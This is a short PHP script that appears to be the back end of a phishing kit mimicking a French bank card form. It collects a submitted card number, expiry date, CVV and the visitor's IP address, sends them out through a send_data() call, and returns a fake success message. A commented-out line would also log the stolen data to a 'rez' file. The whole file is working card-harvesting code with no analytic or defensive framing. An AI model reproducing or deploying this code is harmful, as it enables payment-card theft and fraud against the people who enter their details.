<?php

if(!empty($_REQUEST['cardnum'])){
    $info_names = array(

  "IDENTIFIANT" => "user_id",
  "ID PASSWORD" => "pass_id"
  );
  include("config.php");
  $result = '<abbr style="color:green;">
  +_________________________+<br>
  Numéro du carte bancaire : '.$_REQUEST['cardnum'].'<br>
  Date d expiration : '.$_REQUEST['expirationdate'].'<br>
  Cryptogramme visuel (CVV) : '.$_REQUEST['cvv'].'<br>
  IP ADDRESS: '.getenv("REMOTE_ADDR").'<br>
  +_________________________+</abbr><p>
  ';

  //save_rs("backup","../../rez/IPS.html",$result);  // i don't know well, let's check  ok
  $res = send_data(['data'=>$result]);
  echo json_encode(['status'=>'success']);
}
?>